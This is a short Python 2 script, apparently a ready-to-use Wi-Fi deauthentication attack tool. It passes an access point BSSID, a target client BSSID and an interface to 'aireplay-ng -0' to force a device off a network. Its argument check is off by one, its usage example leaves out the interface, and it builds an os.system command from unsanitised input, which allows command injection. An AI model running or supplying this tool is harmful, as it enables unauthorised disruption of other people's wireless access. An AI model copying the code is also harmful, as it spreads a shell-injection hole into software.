#!/usr/bin/python
import os
import sys

def usage():
    print "Usage: ./deauth.py -a [access_point_bssid] -t [target_bssid] -i interface"
    print "Example: ./deauth.py -a 34:97:F6:61:8D:D0 -t C0:62:6B:E5:E0:80"

def deauth(access_point_bssid, target_bssid, interface):
    command = "aireplay-ng -0 1 -a {} -c {} {}".format(access_point_bssid, target_bssid, interface)

    os.system(command)

args = 0

for i in sys.argv:
    args += 1

if args < 6:
    usage()
    exit()

access_point_bssid = sys.argv[2]
target_bssid = sys.argv[4]
interface = sys.argv[6]

deauth(access_point_bssid, target_bssid, interface)
